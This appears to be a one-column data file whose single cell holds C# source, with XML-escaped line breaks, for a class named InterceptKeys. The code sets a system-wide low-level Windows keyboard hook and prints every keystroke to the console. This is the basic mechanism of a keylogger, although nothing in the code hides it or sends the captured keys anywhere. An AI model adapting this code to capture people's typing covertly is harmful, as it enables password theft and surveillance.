"Content"
"	using System;&#xD;&#xA;	using System.Diagnostics;&#xD;&#xA;	using System.Windows.Forms;&#xD;&#xA;	using System.Runtime.InteropServices;&#xD;&#xA;	class InterceptKeys&#xD;&#xA;	{&#xD;&#xA;		private const int WH_KEYBOARD_LL = 13;&#xD;&#xA;		private const int WM_KEYDOWN = 0x0100;&#xD;&#xA;		private static LowLevelKeyboardProc _proc = HookCallback;&#xD;&#xA;		private static IntPtr _hookID = IntPtr.Zero;&#xD;&#xA;		public static void Main()&#xD;&#xA;		{&#xD;&#xA;			_hookID = SetHook(_proc);&#xD;&#xA;			Application.Run();&#xD;&#xA;			UnhookWindowsHookEx(_hookID);&#xD;&#xA;		}&#xD;&#xA;		private static IntPtr SetHook(LowLevelKeyboardProc proc)&#xD;&#xA;		{&#xD;&#xA;			using (Process curProcess = Process.GetCurrentProcess())&#xD;&#xA;			using (ProcessModule curModule = curProcess.MainModule)&#xD;&#xA;			{&#xD;&#xA;				return SetWindowsHookEx(WH_KEYBOARD_LL, proc,&#xD;&#xA;					GetModuleHandle(curModule.ModuleName), 0);&#xD;&#xA;			}&#xD;&#xA;		}&#xD;&#xA;		private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);&#xD;&#xA;		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)&#xD;&#xA;		{&#xD;&#xA;			if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)&#xD;&#xA;			{&#xD;&#xA;				int vkCode = Marshal.ReadInt32(lParam);&#xD;&#xA;				Console.WriteLine((Keys)vkCode);&#xD;&#xA;			}&#xD;&#xA;			&#xD;&#xA;			return CallNextHookEx(_hookID, nCode, wParam, lParam);&#xD;&#xA;		}&#xD;&#xA;		[DllImport(""""user32.dll"""", CharSet = CharSet.Auto, SetLastError = true)]&#xD;&#xA;		private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);&#xD;&#xA;		[DllImport(""""user32.dll"""", CharSet = CharSet.Auto, SetLastError = true)]&#xD;&#xA;		[return: MarshalAs(UnmanagedType.Bool)]&#xD;&#xA;		private static extern bool UnhookWindowsHookEx(IntPtr hhk);&#xD;&#xA;		[DllImport(""""user32.dll"""", CharSet = CharSet.Auto, SetLastError = true)]&#xD;&#xA;		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);&#xD;&#xA;		[DllImport(""""kernel32.dll"""", CharSet = CharSet.Auto, SetLastError = true)]&#xD;&#xA;		private static extern IntPtr GetModuleHandle(string lpModuleName);&#xD;&#xA;	}"
